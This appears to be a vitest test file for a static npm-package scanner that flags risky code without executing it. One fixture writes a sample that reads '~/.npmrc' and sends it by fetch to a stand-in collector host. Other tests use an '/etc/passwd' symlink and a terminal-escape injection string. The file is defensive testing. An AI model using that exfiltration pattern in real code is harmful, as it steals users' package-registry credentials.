import { mkdtemp, writeFile, mkdir, symlink, rm, readFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { scanDirectory, LIMITS } from '../src/scan.js';
import { renderReport } from '../src/report.js';

const directories: string[] = [];
afterEach(async () => { await Promise.all(directories.splice(0).map(path => rm(path, { recursive: true, force: true }))); });
async function fixture(scripts: Record<string, string> = {}) {
  const path = await mkdtemp(join(tmpdir(), 'devprotect-test-'));
  directories.push(path);
  await writeFile(join(path, 'package.json'), JSON.stringify({ name: 'test-package', version: '1.0.0', scripts }));
  return path;
}

describe('local static scan', () => {
  it('records evidence and hashes without executing lifecycle scripts or source', async () => {
    const path = await fixture({ preinstall: 'touch SHOULD_NOT_EXIST' });
    await writeFile(join(path, 'index.js'), `import fs from 'node:fs';\nimport cp from 'node:child_process';\nconst secret = fs.readFileSync('/home/user/.npmrc');\nfetch('https://collector.invalid', {body: secret});\nthrow new Error('must never execute');`);
    const before = await readFile(join(path, 'package.json'));
    const result = await scanDirectory(path);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ rule: 'credential-reference', file: 'index.js', line: 3 }),
      expect.objectContaining({ rule: 'process-module-reference', line: 2 }),
      expect.objectContaining({ rule: 'network-destination', line: 4 }),
    ]));
    expect(result.files.every(file => /^[a-f0-9]{64}$/.test(file.sha256))).toBe(true);
    expect(result.scripts[0]?.status).toBe('not-run');
    await expect(readFile(join(path, 'SHOULD_NOT_EXIST'))).rejects.toThrow();
    expect(await readFile(join(path, 'package.json'))).toEqual(before);
  });

  it('retains incomplete coverage for a benign package', async () => {
    const path = await fixture();
    await writeFile(join(path, 'index.ts'), 'export const answer: number = 42;');
    const result = await scanDirectory(path);
    expect(result.findings).toEqual([]);
    expect(result.coverage.status).toBe('incomplete');
    expect(result.coverage.gaps.map(gap => gap.stage)).toContain('simulation');
    expect(renderReport(result)).not.toContain('package is safe');
  });

  it('reports links, unreadable source syntax, excluded directories and oversized files', async () => {
    const path = await fixture();
    await symlink('/etc/passwd', join(path, 'outside.js'));
    await mkdir(join(path, 'node_modules'));
    await writeFile(join(path, 'broken.js'), 'const =');
    await writeFile(join(path, 'large.js'), Buffer.alloc(LIMITS.fileBytes + 1));
    const report = await scanDirectory(path);
    expect(report.files.map(file => file.path)).toEqual(['broken.js', 'package.json']);
    expect(report.coverage.gaps).toEqual(expect.arrayContaining([
      expect.objectContaining({ file: 'outside.js', reason: 'Symbolic link skipped' }),
      expect.objectContaining({ file: 'broken.js', stage: 'static' }),
      expect.objectContaining({ file: 'large.js', stage: 'inventory' }),
      expect.objectContaining({ file: 'node_modules', reason: 'Excluded directory' }),
    ]));
  });

  it('rejects malformed manifests and manifest symlinks', async () => {
    const path = await fixture();
    await writeFile(join(path, 'package.json'), '[]');
    await expect(scanDirectory(path)).rejects.toThrow('object');
    await rm(join(path, 'package.json'));
    await symlink('/etc/passwd', join(path, 'package.json'));
    await expect(scanDirectory(path)).rejects.toThrow();
  });

  it('escapes terminal controls and line breaks in package-controlled text', async () => {
    const path = await fixture({ install: '\u001b[31m\nforged security event' });
    const output = renderReport(await scanDirectory(path));
    expect(output).not.toContain('\u001b');
    expect(output).toContain('\\u001b[31m\\nforged security event');
  });
});
